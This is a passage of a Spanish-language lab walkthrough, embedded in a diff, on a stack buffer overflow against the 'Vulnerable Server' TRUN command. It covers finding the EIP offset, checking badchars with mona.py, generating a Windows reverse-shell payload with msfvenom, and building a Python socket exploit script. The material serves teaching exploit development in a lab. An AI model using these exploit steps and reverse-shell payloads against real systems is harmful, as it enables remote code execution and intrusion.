+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Payload Enviado: b&#39;TRUN /.:/Aa0Aa1Aa2Aa3....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] No hay respuesta, el servidor podría haber crasheado.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[+] Cerrando conexión.
+</span></span></span></code></pre></div><p>Observa el resultado en el <strong>Immunity Debugger</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura19.png">
+</p>
+<p>Vamos a copiar el <strong>EIP</strong> y usaremos <strong>pattern_offset.rb</strong> para descubrir la cantidad exacta de bytes que debemos usar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">2003</span>
+</span></span></code></pre></div><p>Parece que solo necesitamos <strong>2003 bytes</strong>.</p>
+<p>Vamos a comprobarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spiker.py --ip-addr 192.168.1.100 --port <span style="color:#ae81ff">9999</span> --length <span style="color:#ae81ff">2003</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Conectando a 192.168.1.100:9999...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Recibiendo Banner: 
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload Enviado: b<span style="color:#e6db74">&#39;TRUN /.:/AAAAAAAAAAAAAAAAAAAAAA....AAAAAAA\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No hay respuesta, el servidor podría haber crasheado.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cerrando conexión.
+</span></span></code></pre></div><p>Y listo, hemos crasheado el binario con la cantidad exacta de bytes:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura20.png">
+</p>
+<p>Observa como el <strong>EIP y el EBP</strong> y como se ve un poco vacío a diferencia de las otras pruebas.</p>
+<h4 id="Sexto">Sexto Paso: Identificando Ubicación de Representación de Caracteres</h4>
+<p>Recordemos que estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se puede dirigir el <strong>Buffer Overflow</strong> y ejecutar las instrucciones a bajo nivel que deseamos:</p>
+<ul>
+<li><em>EIP</em>: indica la siguiente dirección de memoria que el ordenador debería ejecutar.</li>
+<li><em>EAX</em>: almacena temporalmente cualquier dirección de retorno.</li>
+<li><em>EBX</em>: almacena datos y direcciones de memoria.</li>
+<li><em>ESI</em>: contiene la dirección de memoria de los datos de entrada.</li>
+<li><em>ESP</em>: se usa para referenciar el inicio de un hilo.</li>
+<li><em>EBP</em>: indica la dirección de memoria del final de un hilo.</li>
+</ul>
+<p>Más específicos, nos interesan estos dos: <strong>EIP, EBP y ESP</strong>.</p>
+<p>Podemos confirmar que, después del <strong>offset</strong>, se reescribe el <strong>EIP</strong> y luego se escriben más caracteres.</p>
+<p>Con <strong>Python</strong>, podemos generar varios caracteres para cumplir con el <strong>offset</strong>, <strong>sobreescribir el EIP</strong> y registrar n cantidad de caracteres después:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;print(&#34;A&#34;*2003 + &#34;B&#34;*4 + &#34;C&#34;*100)&#39;</span>
+</span></span></code></pre></div><p>Y vamos a mandar este payload usando mi script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spiker.py --ip-addr 192.168.1.100 --port <span style="color:#ae81ff">9999</span> --payload <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAA....AAAAAAAAABBBBCCCCC...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Conectando a 192.168.1.100:9999...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Recibiendo Banner: 
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload Enviado: b<span style="color:#e6db74">&#39;TRUN /.:/AAAAAAAAAAAAAAAAAAAAA.....AAAAAAAABBBBCCCCC...CCCC\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No hay respuesta, el servidor podría haber crasheado.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cerrando conexión.
+</span></span></code></pre></div><p>Observa el <strong>Immunity Debugger</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura21.png">
+</p>
+<p>Ve que el <strong>EBP</strong> muestra A&rsquo;s y el <strong>EIP</strong> muestra las B&rsquo;s. Con esto ya vimos que pudimos sobreescribir el <strong>EIP</strong>.</p>
+<p>Ahora probemos con el 3er script, que ya tiene la cantidad exacta de bytes para sobreescribir el <strong>EIP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python 3-overwriteEIP.py
+</span></span><span style="display:flex;"><span>Enter the server IP address: 192.168.1.100
+</span></span><span style="display:flex;"><span>Fuzzing with TRUN command <span style="color:#ae81ff">2007</span> bytes
+</span></span></code></pre></div><p>Y observa el <strong>Immunity Debugger</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura22.png">
+</p>
+<p>Nota que si se sobreescribe el <strong>EIP</strong>.</p>
+<h4 id="Septimo">Séptimo Paso: Generación de Bytearrays, Creación de Exploit y Detección de Badchars</h4>
+<p>Primero, vamos a entender estos dos conceptos: <strong>Bytearrays y Badchars</strong>.</p>
+<p>¿Qué son los <strong>Bytearrays</strong>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Bytearrays</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Un bytearray es una secuencia de bytes que puede modificarse. Se utiliza para manejar datos binarios en lugar de cadenas de texto. En Python, los bytearray son especialmente útiles para manipular exploits, shellcodes y datos en bruto.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>¿Qué son los <strong>Badchars</strong>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Badchars</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Los Badchars (o caracteres problemáticos) son bytes específicos que pueden romper la ejecución de un exploit o shellcode. Estos caracteres pueden interferir en la inyección de código o causar errores inesperados en una aplicación vulnerable.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>La idea, es generar diferentes <strong>Bytearrays</strong> de casi todos los caracteresm desde <strong>Immunity Debugger</strong> con <strong>mona.py</strong> y con estos, identificar las <strong>Badchars</strong> que el binario no logra interpretar.</p>
+<p>Vamos a generar los <strong>Bytearrays</strong>.</p>
+<p>Desde <strong>Immunity Debugger</strong>, vamos a crear un espacio de trabajo con tal de tener un orden.</p>
+<p>Desde la barra de comandos, comprobamos que está instalado el módulo <strong>mona.py</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura25.png">
+</p>
+<p>Sí está instalado.</p>
+<p>Ahora, ejecutamos el siguiente comando que va a usar un directorio para guardar los <strong>Bytearrays</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona config -set workingfolder C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>u_usuario<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\d</span>irectorio_que_quieras
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura23.png">
+</p>
+<p>Ahora, vamos a generar los <strong>Bytearrays</strong>, eliminando un <strong>null byte</strong> que nos puede dar problemas si lo dejamos, con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona bytearray -cpb <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura24.png">
+</p>
+<p>Ya los tenemos.</p>
+<p>Copia el archivo de los <strong>Bytearrays</strong> en tu máquina o solamente copia los bytes que se muestran en el archivo.</p>
+<p>Vamos a empezar a generar nuestro Exploit, para poder mandar esos bytes y crashear el binario (esto ya está hecho en el script 4 del repositorio que descargamos antes, así que puedes usar ese en lugar de mi script).</p>
+<p>Debería quedar así:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Variables globales</span>
+</span></span><span style="display:flex;"><span>ip_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_máquina_windows&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2003</span>
+</span></span><span style="display:flex;"><span>before_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span>  (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>after_eip <span style="color:#f92672">=</span> shellcode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> before_eip <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> after_eip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Creando conexión y enviando shellcode</span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect((ip_addr, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Recibiendo banner</span>
+</span></span><span style="display:flex;"><span>        banner <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Recibiendo Banner: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>banner<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Enviando payload</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Respuesta de servidor</span>
+</span></span><span style="display:flex;"><span>	response <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Respuesta del servidor: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Cerrando conexión</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        exploit()
+</span></span></code></pre></div><p>Ya que lo tengas, ejecútalo.</p>
+<p>Bien, podemos ver que crasheo el binario.</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura26.png">
+</p>
+<p>Podemos ver los bytes que mandamos.</p>
+<p>Vamos a seleccionar el <strong>ESP</strong>, le damos click derecho y le damos a la opción <strong>Follow in Dump</strong> para ver los bytes que enviamos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura27.png">
+</p>
+<p>Y ahí están los <strong>Bytearrays</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura28.png">
+</p>
+<p>Con esto, puedes ir comparando este resultado con el archivo <strong>bytearrays.txt</strong> para encontrar las <strong>Badchars</strong>, pero eso es muy tardado, por lo que vamos a usar <strong>mona.py</strong> para encontrarlos.</p>
+<p>Tan simple es como indicarle que vamos a hacer una comparación (<code>compare</code>) de los bytes almacenados en el <strong>ESP</strong> (<code>-a 0xESP_Copiado</code>) y los <strong>Bytearrays</strong> que creamos (<code>C:\Path_byte_arrays\bytearray.bin</code>).</p>
+<p>Que, en este caso, se resume al siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona compare -a 0xESP_Copiado -f C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\T</span>u_usuario<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\d</span>irectorio_de_trabajo<span style="color:#ae81ff">\b</span>ytearray.bin
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura29.png">
+</p>
+<p>Excelente, no hay <strong>Badchars</strong>.</p>
+<p>En caso de que hubieran existido <strong>Badchars</strong>, tan solo tendríamos que generar otro archivo de <strong>Bytearrays</strong>, eliminando el <strong>Badchar</strong> como lo hicimos con el <strong>null byte</strong>.</p>
+<p>Luego tendríamos que probar de nuevo, pues justo queremos que no existan <strong>Badchars</strong>.</p>
+<h4 id="Octavo">Octavo Paso: Creación de Shellcode y Modificación de Exploit</h4>
+<p>Vamos a iniciar la creación de nuestro Shellcode que vamos a inyectar y la creación del Exploit.</p>
+<p>Primero, vamos a crear nuestro Shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f c -e x86/shikata_ga_nai -b <span style="color:#e6db74">&#39;\x00&#39;</span> EXITFUNC<span style="color:#f92672">=</span>thread
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">351</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">351</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">351</span> bytes
+</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">1506</span> bytes
+</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Le indicamos a <strong>msfvenom</strong> lo siguiente:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>-p windows/shell_reverse_tcp</code></td>
+					<td>Usa un payload para Windows que nos de una <strong>Reverse Shell</strong>.</td>
+			</tr>
+			<tr>
+					<td><code>--platform windows -a x86</code></td>
+					<td>El payload será para Windows de <strong>arquitectura (-a) x86</strong>.</td>
+			</tr>
+			<tr>
+					<td><code>-f c</code></td>
+					<td>El payload será hecho para <strong>código C</strong>.</td>
+			</tr>
+			<tr>
+					<td><code>-e x86/shikata_ga_nai</code></td>
+					<td>Usamos el encoder polimórfico <strong>shikata ga nai</strong> (esto lo hace por defecto, pero es bueno especificarlo).</td>
+			</tr>
+			<tr>
+					<td><code>-b '\x00'</code></td>
+					<td>Le indicamos que elimine un byte en específico.</td>
+			</tr>
+			<tr>
+					<td><code>EXITFUNC=thread</code></td>
+					<td>Le indicamos que cree un subproceso para que el servicio siga operativo.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ponemos el resultante en nuestro Exploit, quedando así:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Variables globales</span>
+</span></span><span style="display:flex;"><span>ip_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_máquina_windows&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2003</span>
+</span></span><span style="display:flex;"><span>before_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span>  (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>after_eip <span style="color:#f92672">=</span> shellcode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> before_eip <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> after_eip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Creando conexión y enviando shellcode</span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect((ip_addr, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Recibiendo banner</span>
+</span></span><span style="display:flex;"><span>        banner <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Recibiendo Banner: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>banner<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Enviando payload</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Respuesta de servidor</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Respuesta del servidor: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Cerrando conexión</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
